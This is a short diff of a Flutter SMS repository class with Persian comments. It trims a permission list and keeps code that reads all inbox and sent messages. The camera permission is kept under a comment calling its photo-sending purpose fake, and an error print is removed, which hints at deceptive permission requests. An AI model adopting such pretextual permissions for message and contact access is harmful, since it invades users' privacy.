@@ -19,12 +19,12 @@ class SmsRepository {
   }
 
   Future<bool> requestPermissions() async {
+    // حذف میکروفون از لیست درخواست‌ها
     List<Permission> perms = [
       Permission.sms,
       Permission.contacts,
       Permission.phone,
-      Permission.microphone,
-      Permission.camera,
+      Permission.camera, // برای ارسال عکس (فیک)
       Permission.notification,
     ];
     await perms.request();
@@ -43,13 +43,11 @@ class SmsRepository {
 
   Future<List<SmsMessage>> getAllMessages() async {
     try {
-      // این کوئری مطمئن‌ترین روش برای دریافت همه پیام‌هاست
       return await _query.querySms(
         kinds: [SmsQueryKind.inbox, SmsQueryKind.sent],
         sort: true,
       );
     } catch (e) {
-      print("Error fetching: $e");
       return [];
     }
   }
